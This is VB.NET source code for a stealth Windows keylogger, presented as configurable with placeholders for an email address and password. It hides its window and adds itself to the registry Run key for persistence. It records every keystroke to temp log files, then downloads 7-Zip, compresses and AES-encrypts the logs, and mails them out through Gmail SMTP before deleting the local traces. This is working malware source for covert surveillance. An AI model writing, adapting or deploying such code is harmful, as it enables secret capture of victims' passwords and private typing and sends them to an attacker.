Imports System.IO
Imports System.IO.Compression
Imports System.Net.Mail
Public Class Form1
    'Set Your Information here
    Dim sevenzip = "https://www.7-zip.org/a/7za920.zip"
    Dim logsize = "10000" '10000 bytes = 10KB 
    Dim email = "example@gmail.com"
    ''Set password of encryption and email on line no. 348
    Dim subject = "This is email title"
    Dim body = "this is small description or you can say small message..."
    Dim delay = "10" 'in seconds
    'Information ends here
    Private i = 0
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        ShowInTaskbar = False
        ShowIcon = False
        Opacity = 0
        Hide()
        Threading.Thread.Sleep(delay)
        For a = 0 To 255
            If Not GetAsyncKeyState(a) = Nothing Then
                If My.Computer.Info.OSFullName.Contains("Windows") Then
                    My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)
                    Timer1.Enabled = True
                    Timer2.Enabled = False
                End If
            End If
        Next
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim y = Environ("windir") & "\Temp\Logs\"
        If Not Directory.Exists(y) Then
            Directory.CreateDirectory(y)
        End If
        Dim m = My.Computer.Keyboard.ShiftKeyDown
        Dim a = Not IsKeyLocked(Keys.CapsLock) And Not m
        Dim l As String = Nothing
        If GetAsyncKeyState(65) Then
            If a Then
                l += "a"
            Else
                l += "A"
            End If
        ElseIf GetAsyncKeyState(66) Then
            If a Then
                l += "b"
            Else
                l += "B"
            End If
        ElseIf GetAsyncKeyState(67) Then
            If a Then
                l += "c"
            Else
                l += "C"
            End If
        ElseIf GetAsyncKeyState(68) Then
            If a Then
                l += "d"
            Else
                l += "D"
            End If
        ElseIf GetAsyncKeyState(69) Then
            If a Then
                l += "e"
            Else
                l += "E"
            End If
        ElseIf GetAsyncKeyState(70) Then
            If a Then
                l += "f"
            Else
                l += "F"
            End If
        ElseIf GetAsyncKeyState(71) Then
            If a Then
                l += "g"
            Else
                l += "G"
            End If
        ElseIf GetAsyncKeyState(72) Then
            If a Then
                l += "h"
            Else
                l += "H"
            End If
        ElseIf GetAsyncKeyState(73) Then
            If a Then
                l += "i"
            Else
                l += "I"
            End If
        ElseIf GetAsyncKeyState(74) Then
            If a Then
                l += "j"
            Else
                l += "J"
            End If
        ElseIf GetAsyncKeyState(75) Then
            If a Then
                l += "k"
            Else
                l += "K"
            End If
        ElseIf GetAsyncKeyState(76) Then
            If a Then
                l += "l"
            Else
                l += "L"
            End If
        ElseIf GetAsyncKeyState(77) Then
            If a Then
                l += "m"
            Else
                l += "M"
            End If
        ElseIf GetAsyncKeyState(78) Then
            If a Then
                l += "n"
            Else
                l += "N"
            End If
        ElseIf GetAsyncKeyState(79) Then
            If a Then
                l += "o"
            Else
                l += "O"
            End If
        ElseIf GetAsyncKeyState(80) Then
            If a Then
                l += "p"
            Else
                l += "P"
            End If
        ElseIf GetAsyncKeyState(81) Then
            If a Then
                l += "q"
            Else
                l += "Q"
            End If
        ElseIf GetAsyncKeyState(82) Then
            If a Then
                l += "r"
            Else
                l += "R"
            End If
        ElseIf GetAsyncKeyState(83) Then
            If a Then
                l += "s"
            Else
                l += "S"
            End If
        ElseIf GetAsyncKeyState(84) Then
            If a Then
                l += "t"
            Else
                l += "T"
            End If
        ElseIf GetAsyncKeyState(85) Then
            If a Then
                l += "u"
            Else
                l += "U"
            End If
        ElseIf GetAsyncKeyState(86) Then
            If a Then
                l += "v"
            Else
                l += "V"
            End If
        ElseIf GetAsyncKeyState(87) Then
            If a Then
                l += "w"
            Else
                l += "W"
            End If
        ElseIf GetAsyncKeyState(88) Then
            If a Then
                l += "x"
            Else
                l += "X"
            End If
        ElseIf GetAsyncKeyState(89) Then
            If a Then
                l += "y"
            Else
                l += "Y"
            End If
        ElseIf GetAsyncKeyState(90) Then
            If a Then
                l += "z"
            Else
                l += "Z"
            End If
        ElseIf GetAsyncKeyState(48) Then
            If m Then
                l += ")"
            Else
                l += "0"
            End If
        ElseIf GetAsyncKeyState(49) Then
            If m Then
                l += "!"
            Else
                l += "1"
            End If
        ElseIf GetAsyncKeyState(50) Then
            If m Then
                l += "@"
            Else
                l += "2"
            End If
        ElseIf GetAsyncKeyState(51) Then
            If m Then
                l += "#"
            Else
                l += "3"
            End If
        ElseIf GetAsyncKeyState(52) Then
            If m Then
                l += "$"
            Else
                l += "4"
            End If
        ElseIf GetAsyncKeyState(53) Then
            If m Then
                l += "%"
            Else
                l += "5"
            End If
        ElseIf GetAsyncKeyState(54) Then
            If m Then
                l += "^"
            Else
                l += "6"
            End If
        ElseIf GetAsyncKeyState(55) Then
            If m Then
                l += "&"
            Else
                l += "7"
            End If
        ElseIf GetAsyncKeyState(56) Then
            If m Then
                l += "*"
            Else
                l += "8"
            End If
        ElseIf GetAsyncKeyState(57) Then
            If m Then
                l += "("
            Else
                l += "9"
            End If
        ElseIf GetAsyncKeyState(186) Then
            If m Then
                l += ":"
            Else
                l += ";"
            End If
        ElseIf GetAsyncKeyState(187) Then
            If m Then
                l += "+"
            Else
                l += "="
            End If
        ElseIf GetAsyncKeyState(188) Then
            If m Then
                l += "<"
            Else
                l += ","
            End If
        ElseIf GetAsyncKeyState(189) Then
            If m Then
                l += "_"
            Else
                l += "-"
            End If
        ElseIf GetAsyncKeyState(190) Then
            If m Then
                l += ">"
            Else
                l += "."
            End If
        ElseIf GetAsyncKeyState(191) Then
            If m Then
                l += "?"
            Else
                l += "/"
            End If
        ElseIf GetAsyncKeyState(220) Then
            If m Then
                l += "|"
            Else
                l += "\"
            End If
        ElseIf GetAsyncKeyState(221) Then
            If m Then
                l += "}"
            Else
                l += "]"
            End If
        ElseIf GetAsyncKeyState(219) Then
            If m Then
                l += "{"
            Else
                l += "["
            End If
        ElseIf GetAsyncKeyState(222) Then
            If m Then
                l += """"
            Else
                l += "'"
            End If
        ElseIf GetAsyncKeyState(13) Then
            l += vbNewLine
        ElseIf GetAsyncKeyState(32) Then
            l += " "
        ElseIf GetAsyncKeyState(37) Then
            l += "←"
        ElseIf GetAsyncKeyState(38) Then
            l += "↑"
        ElseIf GetAsyncKeyState(39) Then
            l += "→"
        ElseIf GetAsyncKeyState(40) Then
            l += "↓"
        ElseIf GetAsyncKeyState(8) Then
            If My.Computer.FileSystem.FileExists(y & i & ".txt") Then
                Dim j As String = My.Computer.FileSystem.ReadAllText(y & i & ".txt")
                If Not j = Nothing Then
                    My.Computer.FileSystem.WriteAllText(y & i & ".txt", Strings.Left(j, Len(j) - 1), False)
                End If
            End If
            l += ""
        End If
        If Not My.Computer.Keyboard.CtrlKeyDown And Not l = Nothing Then
            Dim p As String = y & i & ".txt"
            If My.Computer.FileSystem.FileExists(p) Then
                If My.Computer.FileSystem.ReadAllText(p).Length > logsize Then
                    If Not My.Computer.FileSystem.FileExists(y & "7za.exe") Then
                        My.Computer.Network.DownloadFile(sevenzip, y & "7za920.zip")
                        ZipFile.ExtractToDirectory(y & "7za920.zip", y)
                    End If
                    Shell(y & "7za.exe a -t7z -m0=lzma2 -mhe=on -mx=9 -mfb=64 -md=32m -ms=on " & y & i & ".7z " & p, AppWinStyle.Hide)
                    If My.Computer.FileSystem.FileExists(y & i & ".7z") Then
                        Dim password = "set your PASSWORD here" ''This is line 348
                        Dim AES As New System.Security.Cryptography.RijndaelManaged
                        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
                        Dim hash(31) As Byte
                        Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.Encoding.ASCII.GetBytes(password))
                        Array.Copy(temp, 0, hash, 0, 16)
                        Array.Copy(temp, 0, hash, 15, 16)
                        AES.Key = hash
                        AES.Mode = Security.Cryptography.CipherMode.ECB
                        Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
                        Dim Buffer = My.Computer.FileSystem.ReadAllBytes(y & i & ".7z")
                        Dim encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
                        My.Computer.FileSystem.WriteAllText(y & "aes" & i & ".txt", encrypted, True)
                        Try
                            Using Attachment = New Attachment(y & "aes" & i & ".txt")
                                Using q As New MailMessage With {
                             .Subject = subject
                         }
                                    q.To.Add(email)
                                    q.From = New MailAddress(email)
                                    q.Body = body
                                    q.Attachments.Add(Attachment)
                                    Using SMTP As New SmtpClient("smtp.gmail.com") With {
                                 .EnableSsl = True,
                                 .Credentials = New Net.NetworkCredential(email, password),
                                 .Port = "587"
                             }
                                        SMTP.Send(q)
                                    End Using
                                End Using
                            End Using
                        Catch
                        End Try
                        For Each d In Directory.GetFiles(Environ("windir") & "\Temp\Logs\")
                            If Not d.Contains("7za.exe") And Not d.Contains("aes" & i & ".txt") Then
                                IO.File.Delete(d)
                            End If
                        Next
                        i += 1
                    End If
                End If
            End If
            My.Computer.FileSystem.WriteAllText(p, l, True)
        End If
    End Sub
End Class
